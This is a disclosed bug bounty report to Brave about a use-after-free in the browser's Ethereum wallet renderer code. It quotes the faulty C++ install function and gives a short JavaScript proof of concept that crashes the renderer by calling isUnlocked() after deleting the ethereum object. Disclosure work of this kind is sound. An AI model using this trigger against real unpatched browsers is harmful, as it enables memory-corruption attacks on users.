# UAF on JSEthereumProvider

## Report Details
- **Report ID**: 1977252
- **URL**: https://hackerone.com/reports/1977252
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-05-08T16:05:40.214Z
- **Disclosed**: 2023-10-11T17:02:49.777Z

## Reporter
- **Username**: nick0ve
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
There is a UAF (Use After Free) vulnerability in the renderer implementation of the Ethereum wallet.

When the Ethereum wallet is connected, every V8 render gets this piece of code installed, creating a new object ethereum accessible from V8. You can find the code here: https://github.com/brave/brave-core/blob/45c6649a124dd8d0ffb19ca6f7047bebb6e6da2c/components/brave_wallet/renderer/js_ethereum_provider.cc#L163-L164

I will highlight some parts of the JSEthereumProvider::Install function that show the bug:

```cpp
// 1. Create a new handle to JSEthereumProvider and convert it to a v8::Object
gin::Handle<JSEthereumProvider> provider =
    gin::CreateHandle(isolate, new JSEthereumProvider(render_frame));
if (provider.IsEmpty()) {
  return;
}
v8::Local<v8::Value> provider_value = provider.ToV8();
v8::Local<v8::Object> provider_object =
    provider_value->ToObject(context).ToLocalChecked();

// 2. Create a v8::Proxy for the provider
if (!v8::Proxy::New(context, provider_object, ethereum_proxy_handler_obj)
         .ToLocal(&ethereum_proxy)) {
  // Error handling
}

// 3. Expose it through window.ethereum
global
    ->Set(context, gin::StringToSymbol(isolate, kEthereum), ethereum_proxy)
    .Check();

// 4. Create a new v8::Object and make it accessible through ethereum._metamask
v8::Local<v8::Object> metamask_obj = v8::Object::New(isolate);
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kMetaMask), metamask_obj)
    .Check();

// 5. [BUG] Set a new property called `IsUnlocked`, creating a new callback object bound to `base::Unretained(provider.get())`, making the wrong assumption that ethereum._metamask can never outlive ethereum
provider_object
    ->Set(context, gin::StringToSymbol(isolate, kIsUnlocked),
          gin::CreateFunctionTemplate(
              isolate, base::BindRepeating(&JSEthereumProvider::IsUnlocked,
                                           base::Unretained(provider.get())))
              ->GetFunction(context)
              .ToLocalChecked())
    .Check();
```
The bug can be triggered through JavaScript with the following steps:

1. Get a reference to ethereum._metamask.
2. Delete the ethereum object, which deletes provider.get().
3. Call isUnlocked(), which will point to the deleted provider.get() pointer.

Here is a PoC (Proof of Concept) that can crash the renderer process:
```
function triggerGC() {
  for (let i = 0; i < 100; i++) {
    let a = new Array(1000000);
  }
}

let uafObj = ethereum._metamask;
delete ethereum;
triggerGC();
console.log(await uafObj.isUnlocked());
```

Will try to follow up with a full exploit to show code execution on the renderer process.

## Impact

Get code execution on the renderer process.

## Attachments
No attachments
